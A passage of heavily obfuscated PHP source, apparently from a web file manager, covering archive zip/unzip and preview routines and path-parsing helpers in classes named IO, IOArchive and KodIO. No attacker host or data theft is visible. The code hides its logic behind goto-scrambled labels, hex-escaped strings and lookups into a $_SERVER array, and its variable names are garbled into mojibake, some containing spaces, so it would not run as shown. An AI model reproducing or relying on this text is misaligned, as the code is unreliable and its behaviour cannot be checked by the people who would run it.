…©[$c√∑ÈêáÀª[1020]] . $A¡ﬁîèªıà[$c√∑ÈêáÀª[1013]]); $A¡ﬁîèªıà[$c√∑ÈêáÀª[435]] = $aº‘âû …©; $A¡ﬁîèªıà[$c√∑ÈêáÀª[1000]] = $bœΩèﬂÚ·Ÿ; $cÙÚÇÊ¯¨≤ = array($c√∑ÈêáÀª[1015] => $c√∑ÈêáÀª[1023], $c√∑ÈêáÀª[6] => $A¡ﬁîèªıà); } break; default: $bœΩèﬂÚ·Ÿ = $A¡ﬁîèªıà[$c√∑ÈêáÀª[75]]; $cÙÚÇÊ¯¨≤ = array($c√∑ÈêáÀª[1015] => $c√∑ÈêáÀª[1024]); break; } $báûÜ÷∏º‰ = $A¡ﬁîèªıà[$c√∑ÈêáÀª[75]]; if (!isset(self::$driverCache[$báûÜ÷∏º‰])) { $f´ßÇ±Ÿ©… = strtolower($cÙÚÇÊ¯¨≤[$c√∑ÈêáÀª[90]]); $eÕàº¬ÀæÁ = $GLOBALS[$c√∑ÈêáÀª[6]][$c√∑ÈêáÀª[84]][$c√∑ÈêáÀª[1025]]; $dÇﬂ©∑π≠ô = $c√∑ÈêáÀª[71] . (isset($eÕàº¬ÀæÁ[$f´ßÇ±Ÿ©…]) ? $eÕàº¬ÀæÁ[$f´ßÇ±Ÿ©…] : ucfirst($f´ßÇ±Ÿ©…)); if (!class_exists($dÇﬂ©∑π≠ô)) { show_json("{$dÇﬂ©∑π≠ô}\x20\x6e\x6f\164\x20\145\170\151\163\x74\163\x21", !1); } $D§äÃæ»¥◊ = isset($cÙÚÇÊ¯¨≤[$c√∑ÈêáÀª[6]]) ? $cÙÚÇÊ¯¨≤[$c√∑ÈêáÀª[6]] : !1; self::$driverCache[$báûÜ÷∏º‰] = new $dÇﬂ©∑π≠ô($D§äÃæ»¥◊); } goto f¨ò˘ô±é©; Bﬂä´å‰€Î: if (isset($cÙÚÇÊ¯¨≤[$c√∑ÈêáÀª[6]][$c√∑ÈêáÀª[1026]])) { $eÔ‘÷ôÜ‹Ô->pathBase = rtrim($cÙÚÇÊ¯¨≤[$c√∑ÈêáÀª[6]][$c√∑ÈêáÀª[1026]], $c√∑ÈêáÀª[8]) . $c√∑ÈêáÀª[8]; $bœΩèﬂÚ·Ÿ = $eÔ‘÷ôÜ‹Ô->pathBase . ltrim($bœΩèﬂÚ·Ÿ, $c√∑ÈêáÀª[8]); } $bœΩèﬂÚ·Ÿ = $eÔ‘÷ôÜ‹Ô->getPath($bœΩèﬂÚ·Ÿ); if (isset($A¡ﬁîèªıà[$c√∑ÈêáÀª[1000]])) { $bœΩèﬂÚ·Ÿ = $A¡ﬁîèªıà[$c√∑ÈêáÀª[1000]]; } goto e·Ñ⁄…™…É; d•‰ñÁøÖê: $c√∑ÈêáÀª =& $_SERVER[¯èãÄπµ]; $fÖâÖ§≤†ô = $A¡ﬁîèªıà[$c√∑ÈêáÀª[1014]]; $cÌó÷ñÎŒÕ = $A¡ﬁîèªıà[$c√∑ÈêáÀª[363]]; goto aÔìπÔ¶Ü; B‰¿ëèçÜ‹: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $F‰äÔ£√êá; if (!$F‰äÔ£√êá) { $aîÜ∆®¿Ö— = IO::init($_SERVER[¯èãÄπµ][8]); } return $aîÜ∆®¿Ö—; } private static function iconvSystem($Eé∂±õÕÛÏ) { return self::local()->iconvSystem($Eé∂±õÕÛÏ); } private static function iconvApp($b≈ï–üãÂ‰) { return self::local()->iconvApp($b≈ï–üãÂ‰); } public static function zip($fÿ‹ü–‡€˘, $dí–µßˆ•Õ = "\172\x69\160", $AåÍ˜¡ø†ì = '', $cç•Ü®¶éÔ = REPEAT_RENAME) { goto E≈∑ø⁄Öüã; Fÿ¡ãäâÉ: if (!$FÜŒ…Ù”Ë¥) { del_dir($A¿ŒµüèπÜ); show_json(LNG($e÷çìáŒ Õ[1029]), !1); } del_dir($A¿ŒµüèπÜ); return $FÜŒ…Ù”Ë¥; goto d¡èçﬁúŸÑ; a”àçáñ¶: if (count($cÖî€ÖèÍó) > 1) { $e∫∆¢¥æ÷â = IO::info(IO::pathFather($CÖôµÜÜ¯´[$e÷çìáŒ Õ[75]])); $cÆåË˜¬¬Ô = $e∫∆¢¥æ÷â[$e÷çìáŒ Õ[28]]; } $Cñ˘‹«ãµË = $A¿ŒµüèπÜ; if (!$Cñ˘‹«ãµË) { $Cñ˘‹«ãµË = get_path_father($CÖôµÜÜ¯´[$e÷çìáŒ Õ[75]]); $aÏ…€ÀœÛæ = IO::info($Cñ˘‹«ãµË); if (!$aÏ…€ÀœÛæ[$e÷çìáŒ Õ[185]]) { show_json(LNG($e÷çìáŒ Õ[1028]), !1); } } goto d™õ†ö‰Öå; f∆úÊ¯◊ÃÌ: $A¿ŒµüèπÜ = !1; if (!$AåÍ˜¡ø†ì && $aÔâÀ‡“»Ì->getType() == $e÷çìáŒ Õ[101]) { $cÖî€ÖèÍó = self::zipFileList($fÿ‹ü–‡€˘); } else { $A¿ŒµüèπÜ = $AåÍ˜¡ø†ì ? $AåÍ˜¡ø†ì : TEMP_FILES . $e÷çìáŒ Õ[1027] . time() . rand_string(8) . $e÷çìáŒ Õ[8]; mk_dir($A¿ŒµüèπÜ); $cÖî€ÖèÍó = self::zipFileList($fÿ‹ü–‡€˘, $A¿ŒµüèπÜ); } $cÆåË˜¬¬Ô = $CÖôµÜÜ¯´[$e÷çìáŒ Õ[28]]; goto a”àçáñ¶; E≈∑ø⁄Öüã: $e÷çìáŒ Õ =& $_SERVER[¯èãÄπµ]; $aÔâÀ‡“»Ì = self::init($fÿ‹ü–‡€˘[0][$e÷çìáŒ Õ[75]]); $CÖôµÜÜ¯´ = self::info($fÿ‹ü–‡€˘[0][$e÷çìáŒ Õ[75]]); goto f∆úÊ¯◊ÃÌ; b∆æÏé¨ñ¶: foreach ($cÖî€ÖèÍó as $e≠íîÑñêŒ => $Dáô‘◊ÜÀ–) { $cÖî€ÖèÍó[$e≠íîÑñêŒ] = self::iconvSystem($Dáô‘◊ÜÀ–); } KodArchive::create($dœâç¯õÍﬂ, $cÖî€ÖèÍó); if (!IO::exist($aÿ√∂ﬂ€êË)) { if ($A¿ŒµüèπÜ) { del_dir($A¿ŒµüèπÜ); } show_json(LNG($e÷çìáŒ Õ[1029]), !1); } goto eÁøáçÂæ’; d™õ†ö‰Öå: $aÿ√∂ﬂ€êË = $Cñ˘‹«ãµË . $cÆåË˜¬¬Ô . $e÷çìáŒ Õ[91] . $dí–µßˆ•Õ; $aÿ√∂ﬂ€êË = get_filename_auto($aÿ√∂ﬂ€êË, $e÷çìáŒ Õ[33], $cç•Ü®¶éÔ); $dœâç¯õÍﬂ = self::iconvSystem($aÿ√∂ﬂ€êË); goto b∆æÏé¨ñ¶; eÁøáçÂæ’: if ($AåÍ˜¡ø†ì || !$A¿ŒµüèπÜ) { if ($A¿ŒµüèπÜ && strstr($A¿ŒµüèπÜ, TEMP_FILES)) { $eÂçÃÊå¥ü = $cÖî€ÖèÍó = array(); recursion_dir($Cñ˘‹«ãµË, $eÂçÃÊå¥ü, $cÖî€ÖèÍó, 0); foreach ($eÂçÃÊå¥ü as $CÉ·Î¿†Üí) { del_dir($CÉ·Î¿†Üí); } foreach ($cÖî€ÖèÍó as $a≤ﬁ∏êé°§) { if ($a≤ﬁ∏êé°§ == $dœâç¯õÍﬂ) { continue; } del_file($a≤ﬁ∏êé°§); } } return $aÿ√∂ﬂ€êË; } $Bäãá—Ó˘– = self::pathFather($CÖôµÜÜ¯´[$e÷çìáŒ Õ[75]]); $FÜŒ…Ù”Ë¥ = self::move($aÿ√∂ﬂ€êË, $Bäãá—Ó˘–, $cç•Ü®¶éÔ); goto Fÿ¡ãäâÉ; d¡èçﬁúŸÑ: } public static function unzip($aŒãç±ﬂäâ, $Fì†í›Ñê√ = "\x72\145\160\154\x61\143\145") { goto fÉö·‚ÑäÀ; Bª¿ãá≈ÿ∞: $A§çÊåã∏Ï = self::tmpFileName($dÏ‰§Ç©¡ø); $eÂ”◊¨‹„Ñ = TEMP_FILES . $A§çÊåã∏Ï; del_dir($eÂ”◊¨‹„Ñ); goto C„±Üù˜º–; FŸ∂éçªΩï: Hook::trigger($aÌ”‰ÉîÓß[1037], $eÂ”◊¨‹„Ñ); recursion_dir($eÂ”◊¨‹„Ñ, $aêÇËÉäÉó, $cê˜éùÑ€›, 0); $CÜœ≥ÓñØ© = array_merge($aêÇËÉäÉó, $cê˜éùÑ€›); goto eäöÌÛíì¯; e®ÂŒ°‚°Ò: if (!($dÏ‰§Ç©¡ø = parent::info($aﬁåêœˆ∏â))) { show_json(LNG($aÌ”‰ÉîÓß[1031]), !1); } if (!($AâÑ≠Ú‹„« = parent::infoFull($dÏ«ˆÈ≤˜Ç))) { $dÏ«ˆÈ≤˜Ç = parent::mkdir($dÏ«ˆÈ≤˜Ç); $AâÑ≠Ú‹„« = array($aÌ”‰ÉîÓß[75] => $dÏ«ˆÈ≤˜Ç); } else { if (isset($AâÑ≠Ú‹„«[$aÌ”‰ÉîÓß[365]]) && trim($AâÑ≠Ú‹„«[$aÌ”‰ÉîÓß[75]], $aÌ”‰ÉîÓß[8]) != trim($dÏ«ˆÈ≤˜Ç, $aÌ”‰ÉîÓß[8])) { $CÀÉ∫•†ÉÑ = KodIO::make($AâÑ≠Ú‹„«[$aÌ”‰ÉîÓß[457]]); $Aˆ»∏§√ã‘ = parent::fileNameAuto($CÀÉ∫•†ÉÑ, $AâÑ≠Ú‹„«[$aÌ”‰ÉîÓß[28]], REPEAT_RENAME_FOLDER, !0); $dÏ«ˆÈ≤˜Ç = parent::mkdir($CÀÉ∫•†ÉÑ . $Aˆ»∏§√ã‘); $AâÑ≠Ú‹„« = array($aÌ”‰ÉîÓß[75] => $dÏ«ˆÈ≤˜Ç); } } $dÏ«ˆÈ≤˜Ç = $AâÑ≠Ú‹„«[$aÌ”‰ÉîÓß[75]]; goto Bª¿ãá≈ÿ∞; eäöÌÛíì¯: foreach ($CÜœ≥ÓñØ© as $A¥Œ†ˆô∏Ñ) { $A¥Œ†ˆô∏Ñ = self::iconvApp($A¥Œ†ˆô∏Ñ); self::move($A¥Œ†ˆô∏Ñ, $dÏ«ˆÈ≤˜Ç, $Fì†í›Ñê√); } del_dir($eÂ”◊¨‹„Ñ); if (!$C„∂ªóΩÕ) { del_file($eı∫€ÖØ´»); } goto bï°Ïô§ë«; eØ·êƒıÏ∆: $DçÙÛì´¬§ = KodArchive::extract($eı∫€ÖØ´», $eÂ”◊¨‹„Ñ . $aÌ”‰ÉîÓß[8], $DŸ◊êÇ¨Ç»); self::archiveExt(); if (!$DçÙÛì´¬§[$aÌ”‰ÉîÓß[1034]]) { show_json($aÌ”‰ÉîÓß[1035] . $DçÙÛì´¬§[$aÌ”‰ÉîÓß[1036]], !1); } goto FŸ∂éçªΩï; C„±Üù˜º–: mk_dir($eÂ”◊¨‹„Ñ); $AÂç÷ó’¨Ñ = self::fileExt($dÏ‰§Ç©¡ø); $eı∫€ÖØ´» = $eÂ”◊¨‹„Ñ . $aÌ”‰ÉîÓß[91] . $AÂç÷ó’¨Ñ; goto côúíÌî®…; bï°Ïô§ë«: return !0; goto aÇ◊∑Øâ ˆ; côúíÌî®…: if (!@file_exists(self::iconvSystem($eı∫€ÖØ´»))) { $C„∂ªóΩÕ = self::localFilePath($aﬁåêœˆ∏â, $AÂç÷ó’¨Ñ); $eı∫€ÖØ´» = $C„∂ªóΩÕ ? $C„∂ªóΩÕ : parent::download($aﬁåêœˆ∏â, $eı∫€ÖØ´»); } $eı∫€ÖØ´» = self::iconvSystem($eı∫€ÖØ´»); $DŸ◊êÇ¨Ç» = isset($aŒãç±ﬂäâ[$aÌ”‰ÉîÓß[1032]]) ? $aŒãç±ﬂäâ[$aÌ”‰ÉîÓß[1032]] : $aÌ”‰ÉîÓß[1033]; goto eØ·êƒıÏ∆; fÉö·‚ÑäÀ: $aÌ”‰ÉîÓß =& $_SERVER[¯èãÄπµ]; $aﬁåêœˆ∏â = $aŒãç±ﬂäâ[$aÌ”‰ÉîÓß[75]]; $dÏ«ˆÈ≤˜Ç = $aŒãç±ﬂäâ[$aÌ”‰ÉîÓß[1030]]; goto e®ÂŒ°‚°Ò; aÇ◊∑Øâ ˆ: } public static function unzipList($FÀÔîÓ¬”π) { goto cê¢ÇÚ•Ç˘; Cﬂ„≈ﬁ—¡™: if (!is_dir($DµÑ”±∫ò≠)) { mk_dir($DµÑ”±∫ò≠); } $b–‹¯Ì‘Ìπ = $DµÑ”±∫ò≠ . $Dˆ¨ÿÃâ˜·[8] . $BÒ°…®ˆÛô; if (!@file_exists(self::iconvSystem($b–‹¯Ì‘Ìπ))) { if (isset($a§àã·—®´)) { url_request($EªÚ’Ω§Ëñ, $Dˆ¨ÿÃâ˜·[1041], $b–‹¯Ì‘Ìπ); } else { $FÔÉ§î‰¬ô = self::localFilePath($EªÚ’Ω§Ëñ, $C≤Û‰›ë á); $b–‹¯Ì‘Ìπ = $FÔÉ§î‰¬ô ? $FÔÉ§î‰¬ô : self::download($EªÚ’Ω§Ëñ, $b–‹¯Ì‘Ìπ); } } goto fÿîΩ™„·ï; e∂ √Ø±àè: self::archiveExt(); del_dir($DµÑ”±∫ò≠); if (!$D‚àêÎÎ√‹[$Dˆ¨ÿÃâ˜·[1034]]) { show_json($D‚àêÎÎ√‹[$Dˆ¨ÿÃâ˜·[1036]], !1); } goto AÊíÃúÆãÂ; cüªŸ≤™≤Ü: $a›∞£æ∞‹Ã = 50000; if (request_url_safe($EªÚ’Ω§Ëñ)) { $a§àã·—®´ = parse_url_query($EªÚ’Ω§Ëñ); if (!isset($a§àã·—®´[$Dˆ¨ÿÃâ˜·[75]])) { show_json($Dˆ¨ÿÃâ˜·[1039], !1); } } $Fÿà˜ÛŸ®ü = isset($a§àã·—®´) ? $a§àã·—®´[$Dˆ¨ÿÃâ˜·[75]] : $EªÚ’Ω§Ëñ; goto aéº¶íî÷ö; fÿîΩ™„·ï: $b–‹¯Ì‘Ìπ = self::iconvSystem($b–‹¯Ì‘Ìπ); if ($cïõîùπ•’ >= 0) { $bœÕ˜œä∑ﬁ = isset($FÀÔîÓ¬”π[$Dˆ¨ÿÃâ˜·[1042]]) ? $FÀÔîÓ¬”π[$Dˆ¨ÿÃâ˜·[1042]] : !1; $F®œ÷∞∆©≈ = isset($FÀÔîÓ¬”π[$Dˆ¨ÿÃâ˜·[28]]) ? $FÀÔîÓ¬”π[$Dˆ¨ÿÃâ˜·[28]] : $Dˆ¨ÿÃâ˜·[33]; KodArchive::filePreview($b–‹¯Ì‘Ìπ, $cïõîùπ•’, $bœÕ˜œä∑ﬁ, $F®œ÷∞∆©≈); self::archiveExt(); die; } $D‚àêÎÎ√‹ = KodArchive::listContent($b–‹¯Ì‘Ìπ); goto e∂ √Ø±àè; F‡¬’œèÆØ: if (isset($a§àã·—®´)) { $F¡ÆΩ¢€áÈ = array($a§àã·—®´[$Dˆ¨ÿÃâ˜·[75]], $a§àã·—®´[$Dˆ¨ÿÃâ˜·[1038]], $a§àã·—®´[$Dˆ¨ÿÃâ˜·[28]]); $BÒ°…®ˆÛô = md5(implode($Dˆ¨ÿÃâ˜·[70], $F¡ÆΩ¢€áÈ)) . $Dˆ¨ÿÃâ˜·[91] . get_path_ext($a§àã·—®´[$Dˆ¨ÿÃâ˜·[28]]); } else { $F¡ÆΩ¢€áÈ = array($f®ØÏÑõïÁ[$Dˆ¨ÿÃâ˜·[28]], $f®ØÏÑõïÁ[$Dˆ¨ÿÃâ˜·[75]], $f®ØÏÑõïÁ[$Dˆ¨ÿÃâ˜·[77]]); $BÒ°…®ˆÛô = md5(implode($Dˆ¨ÿÃâ˜·[70], $F¡ÆΩ¢€áÈ)) . $Dˆ¨ÿÃâ˜·[91] . $C≤Û‰›ë á; } if ($cïõîùπ•’ == -1) { $aÕÇ•çûÖÖ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\126\x69\x65\167\x2f{$E˘ÀÊÊ˘øó}\x2f{$BÒ°…®ˆÛô}\x2e\x6c\x6f\x67"; $bﬁó‰ç–Á± = self::infoFull($aÕÇ•çûÖÖ); if ($bﬁó‰ç–Á±) { $aÕÇ•çûÖÖ = $bﬁó‰ç–Á±[$Dˆ¨ÿÃâ˜·[75]]; $FÒÌ∫≈õƒ = self::getContent($aÕÇ•çûÖÖ); if ($FÒÌ∫≈õƒ) { $aŸõö ¿”‡ = json_decode($FÒÌ∫≈õƒ, !0); if (count($aŸõö ¿”‡) >= $a›∞£æ∞‹Ã) { show_json(sprintf(LNG($Dˆ¨ÿÃâ˜·[1040]), count($aŸõö ¿”‡)), !1); } return $aŸõö ¿”‡; } } else { $aÕÇ•çûÖÖ = self::mkfile($aÕÇ•çûÖÖ); } } $DµÑ”±∫ò≠ = TEMP_FILES . $E˘ÀÊÊ˘øó; goto Cﬂ„≈ﬁ—¡™; AÊíÃúÆãÂ: $aŸõö ¿”‡ = json_encode($D‚àêÎÎ√‹[$Dˆ¨ÿÃâ˜·[1036]]); self::setContent($aÕÇ•çûÖÖ, $aŸõö ¿”‡); if (count($D‚àêÎÎ√‹[$Dˆ¨ÿÃâ˜·[1036]]) >= $a›∞£æ∞‹Ã) { show_json(sprintf(LNG($Dˆ¨ÿÃâ˜·[1040]), count($D‚àêÎÎ√‹[$Dˆ¨ÿÃâ˜·[1036]])), !1); } goto dêíÒÉ´âß; dêíÒÉ´âß: return $D‚àêÎÎ√‹[$Dˆ¨ÿÃâ˜·[1036]]; goto f€ÖÃ‡†€‘; cê¢ÇÚ•Ç˘: $Dˆ¨ÿÃâ˜· =& $_SERVER[¯èãÄπµ]; $EªÚ’Ω§Ëñ = $FÀÔîÓ¬”π[$Dˆ¨ÿÃâ˜·[75]]; $cïõîùπ•’ = isset($FÀÔîÓ¬”π[$Dˆ¨ÿÃâ˜·[1038]]) ? $FÀÔîÓ¬”π[$Dˆ¨ÿÃâ˜·[1038]] : -1; goto cüªŸ≤™≤Ü; aéº¶íî÷ö: $f®ØÏÑõïÁ = self::info($Fÿà˜ÛŸ®ü); $C≤Û‰›ë á = self::fileExt($f®ØÏÑõïÁ); $E˘ÀÊÊ˘øó = self::tmpFileName($f®ØÏÑõïÁ); goto F‡¬’œèÆØ; f€ÖÃ‡†€‘: } private static function fileExt($eôÀÓﬂÇ¶ß) { $Bƒ•∑Ëµƒ√ =& $_SERVER[¯èãÄπµ]; $cä®ôãëÎÖ = $eôÀÓﬂÇ¶ß[$Bƒ•∑Ëµƒ√[156]]; if ($cä®ôãëÎÖ == $Bƒ•∑Ëµƒ√[1043]) { $b¬†˜âÿø≈ = $Bƒ•∑Ëµƒ√[1044]; if (substr($eôÀÓﬂÇ¶ß[$Bƒ•∑Ëµƒ√[28]], -strlen($b¬†˜âÿø≈)) == $b¬†˜âÿø≈) { $cä®ôãëÎÖ = $Bƒ•∑Ëµƒ√[1045]; } } self::archiveExt($cä®ôãëÎÖ); return $cä®ôãëÎÖ; } private static function zipFileList($A±™ÏÍ‡çÊ, $Dç©ä€Öÿ› = false) { $a«îƒíãàÓ =& $_SERVER[¯èãÄπµ]; $a∏¯Ç§ê˘ﬂ = array(); foreach ($A±™ÏÍ‡çÊ as $DÃ¢¡∫ÜÁá) { $cüÃ˜⁄êª„ = $DÃ¢¡∫ÜÁá[$a«îƒíãàÓ[75]]; if ($Dç©ä€Öÿ›) { $cüÃ˜⁄êª„ = self::copy($DÃ¢¡∫ÜÁá[$a«îƒíãàÓ[75]], $Dç©ä€Öÿ›, $a«îƒíãàÓ[747]); } if ($cüÃ˜⁄êª„ && self::local()->exist($cüÃ˜⁄êª„)) { $a∏¯Ç§ê˘ﬂ[$DÃ¢¡∫ÜÁá[$a«îƒíãàÓ[75]]] = $cüÃ˜⁄êª„; } } if (!empty($a∏¯Ç§ê˘ﬂ)) { return array_values($a∏¯Ç§ê˘ﬂ); } show_json(LNG($a«îƒíãàÓ[1046]), !1); } public static function tmpFileName($c⁄áÙè¿Ÿá) { $FÃë£∫äŒ¥ =& $_SERVER[¯èãÄπµ]; $f’∂·ÒÂ£ = array($c⁄áÙè¿Ÿá[$FÃë£∫äŒ¥[28]], $c⁄áÙè¿Ÿá[$FÃë£∫äŒ¥[75]], $c⁄áÙè¿Ÿá[$FÃë£∫äŒ¥[77]], $c⁄áÙè¿Ÿá[$FÃë£∫äŒ¥[455]]); return md5(implode($FÃë£∫äŒ¥[70], $f’∂·ÒÂ£)); } private static function localFilePath($f¿ÌÈÖóØÆ, $fˆΩ√©Ü‰√) { goto a•¶º Ã⁄Ó; Bõ◊ßÙÒ°ø: if ($a·Ù∆ûŸáÃ[$Cƒ≠‹»”õ—[29]] == KodIO::KOD_SOURCE) { $Dèêü®øÁπ = Model($Cƒ≠‹»”õ—[755])->fileInfoGet(KodIO::sourceID($f¿ÌÈÖóØÆ)); if (!$Dèêü®øÁπ[$Cƒ≠‹»”õ—[75]]) { show_json($Cƒ≠‹»”õ—[1049], !1); } $f¿ÌÈÖóØÆ = $Dèêü®øÁπ[$Cƒ≠‹»”õ—[75]]; } $A’ß†ËØûÉ = self::init($f¿ÌÈÖóØÆ); $cˆêÖõæÀﬁ = $A’ß†ËØûÉ->getType(); goto cçêÖÂëâ¶; cçêÖÂëâ¶: if ($cˆêÖõæÀﬁ == $Cƒ≠‹»”õ—[101] || $cˆêÖõæÀﬁ == $Cƒ≠‹»”õ—[1050]) { if (!$A’ß†ËØûÉ->exist($A’ß†ËØûÉ->path)) { show_json(LNG($Cƒ≠‹»”õ—[100]), !1); } return $A’ß†ËØûÉ->path; } return !1; goto aÏÿ…⁄¥Ê; a•¶º Ã⁄Ó: $Cƒ≠‹»”õ— =& $_SERVER[¯èãÄπµ]; if ($fˆΩ√©Ü‰√ == $Cƒ≠‹»”õ—[1047] && strtoupper(substr(PHP_OS, 0, 3)) == $Cƒ≠‹»”õ—[1048]) { return !1; } $a·Ù∆ûŸáÃ = KodIO::parse($f¿ÌÈÖóØÆ); goto Bõ◊ßÙÒ°ø; aÏÿ…⁄¥Ê: } private static function archiveExt($A©ÙèÇÀÿí = '') { $GLOBALS[$_SERVER[¯èãÄπµ][1051]] = $A©ÙèÇÀÿí; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\145\162\x52\145\x63\171\x63\154\145\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\x72\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\145\162\x46\x69\x6c\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\162\x46\x69\x6c\x65\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\157\x75\160\x52\x6f\x6f\x74\x53\x65\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\165\163\x65\x72\123\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\x65\162\x53\150\141\162\145\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\x72\x65\x54\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\x72\x65\111\164\x65\x6d\x7d"; const KOD_SHARE_LINK = "\173\x73\150\x61\x72\145\111\x74\145\155\114\151\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\145\x61\162\143\x68\x7d"; const KOD_BLOCK = "\173\142\154\x6f\x63\x6b\x7d"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\165\x73\145\162\x52\145\156\x63\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\144\162\151\x76\145\x72\x7d"; public static function typeList() { $DﬂåËÖ‚œ⁄ =& $_SERVER[¯èãÄπµ]; return array($DﬂåËÖ‚œ⁄[1052] => self::KOD_SOURCE, $DﬂåËÖ‚œ⁄[1053] => self::KOD_USER_RECYCLE, $DﬂåËÖ‚œ⁄[1054] => self::KOD_USER_FAV, $DﬂåËÖ‚œ⁄[1055] => self::KOD_USER_FILE_TAG, $DﬂåËÖ‚œ⁄[1056] => self::KOD_USER_FILE_TYPE, $DﬂåËÖ‚œ⁄[1057] => self::KOD_GROUP_ROOT_SELF, $DﬂåËÖ‚œ⁄[1058] => self::KOD_USER_SHARE, $DﬂåËÖ‚œ⁄[1059] => self::KOD_USER_SHARE_LINK, $DﬂåËÖ‚œ⁄[1060] => self::KOD_USER_SHARE_TO_ME, $DﬂåËÖ‚œ⁄[1061] => self::KOD_SHARE_ITEM, $DﬂåËÖ‚œ⁄[1062] => self::KOD_SHARE_LINK, $DﬂåËÖ‚œ⁄[1063] => self::KOD_SEARCH, $DﬂåËÖ‚œ⁄[1064] => self::KOD_BLOCK, $DﬂåËÖ‚œ⁄[1065] => self::KOD_IO, $DﬂåËÖ‚œ⁄[1066] => self::KOD_USER_RECENT, $DﬂåËÖ‚œ⁄[1067] => self::KOD_USER_DRIVER); } public static function parse($FíÊûΩœíÉ) { goto EÔÓö ìè∞; EÔÓö ìè∞: $Dª££Úäˆî =& $_SERVER[¯èãÄπµ]; $FíÊûΩœíÉ = self::clear($FíÊûΩœíÉ); $BœÉØ⁄˜§¶ = array_values(self::typeList()); goto BåâÖÈê∫Û; BåâÖÈê∫Û: preg_match($Dª££Úäˆî[1068], $FíÊûΩœíÉ, $aèê≠ÏÃ’≈); $Fâ∫É∂ﬁÖÀ = array($Dª££Úäˆî[384] => !1, $Dª££Úäˆî[1069] => !1, $Dª££Úäˆî[381] => !1, $Dª££Úäˆî[75] => $FíÊûΩœíÉ, $Dª££Úäˆî[1014] => !1, $Dª££Úäˆî[1013] => $Dª££Úäˆî[33]); if (is_array($aèê≠ÏÃ’≈) && count($aèê≠ÏÃ’≈) == 5) { $fã∫±ÈÃŒÃ = $Dª££Úäˆî[1070] . $aèê≠ÏÃ’≈[2] . $Dª££Úäˆî[311]; if (in_array($fã∫±ÈÃŒÃ, $BœÉØ⁄˜§¶)) { $Fâ∫É∂ﬁÖÀ[$Dª££Úäˆî[1014]] = $aèê≠ÏÃ’≈[1]; $Fâ∫É∂ﬁÖÀ[$Dª££Úäˆî[29]] = $fã∫±ÈÃŒÃ; $Fâ∫É∂ﬁÖÀ[$Dª££Úäˆî[1071]] = substr($fã∫±ÈÃŒÃ, 1, -1); $Fâ∫É∂ﬁÖÀ[$Dª££Úäˆî[363]] = $aèê≠ÏÃ’≈[3]; } $Fâ∫É∂ﬁÖÀ[$Dª££Úäˆî[1013]] = $aèê≠ÏÃ’≈[4]; } goto BÎ¬òÊÀπÏ; BÎ¬òÊÀπÏ: $dß¯ÖîıË = array($Dª££Úäˆî[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Fâ∫É∂ﬁÖÀ[$Dª££Úäˆî[1072]] = in_array($Fâ∫É∂ﬁÖÀ[$Dª££Úäˆî[29]], $dß¯ÖîıË); return $Fâ∫É∂ﬁÖÀ; goto d†Öû©¿∑¿; d†Öû©¿∑¿: } public static function clear($dÕ£«Ê≠Æù) { goto Fê≠¯Ïåçé; Fê≠¯Ïåçé: $A∑äﬁô†∫π =& $_SERVER[¯èãÄπµ]; $dÕ£«Ê≠Æù = str_replace($A∑äﬁô†∫π[93], $A∑äﬁô†∫π[8], $dÕ£«Ê≠Æù); $A⁄âÙó“‚ê = $A∑äﬁô†∫π[1073]; goto fΩÜ¯ˆÇ«Ö; fΩÜ¯ˆÇ«Ö: if (substr($dÕ£«Ê≠Æù, 0, 3) == $A∑äﬁô†∫π[1074]) { $dÕ£«Ê≠Æù = substr($dÕ£«Ê≠Æù, 3); } while (strstr($dÕ£«Ê≠Æù, $A⁄âÙó“‚ê)) { $dÕ£«Ê≠Æù = str_replace($A⁄âÙó“‚ê, $A∑äﬁô†∫π[8], $dÕ£«Ê≠Æù); } $dÕ£«Ê≠Æù = preg_replace($A∑äﬁô†∫π[1075], $A∑äﬁô†∫π[8], $dÕ£«Ê≠Æù); goto fƒ¿ôÿ◊ôﬁ; fƒ¿ôÿ◊ôﬁ: if ($dÕ£«Ê≠Æù == $A∑äﬁô†∫π[8]) { return $A∑äﬁô†∫π[8]; } $dÕ£«Ê≠Æù = rtrim($dÕ£«Ê≠Æù, $A∑äﬁô†∫π[8]); return $dÕ£«Ê≠Æù; goto FÃå¯â€∏´; FÃå¯â€∏´: } public static function sourceID($a≈·àÍÈ¡Ñ) { $B»Áß¡‡ú± =& $_SERVER[¯èãÄπµ]; $A£˘ÈÑ©÷æ = self::parse($a≈·àÍÈ¡Ñ); if ($A£˘ÈÑ©÷æ[$B»Áß¡‡ú±[29]] !== self::KOD_SOURCE) { show_json(LNG($B»Áß¡‡ú±[1076]), !1); } return $A£˘ÈÑ©÷æ[$B»Áß¡‡ú±[363]]; } public static function make($bÇòùÂ¿åö) { if (!$bÇòùÂ¿åö) { return !1; } return self::makePath(self::KOD_SOURCE, intval($bÇòùÂ¿åö)); } public static function makeShare($f—Ñ¥á¨ıí, $DÓ‡Ñˆ‡¢¢) { return self::makePath(self::KOD_SHARE_ITEM, $f—Ñ¥á¨ıí, $DÓ‡Ñˆ‡¢¢); } public static function makeFileTypePath($aÁˆ û™Á≤) { return self::makePath(self::KOD_USER_FILE_TYPE, $aÁˆ û™Á≤); } public static function makeFileTagPath($D¢ì¥ÔÿΩ⁄) { return self::makePath(self::KOD_USER_FILE_TAG, $D¢ì¥ÔÿΩ⁄); } public static function makePath($bﬁèÊ‘ø¿•, $B†∫åŸê’π = '', $d•Œ¡†Ç£Ë = '') { $f≥ìê⁄ôÿà =& 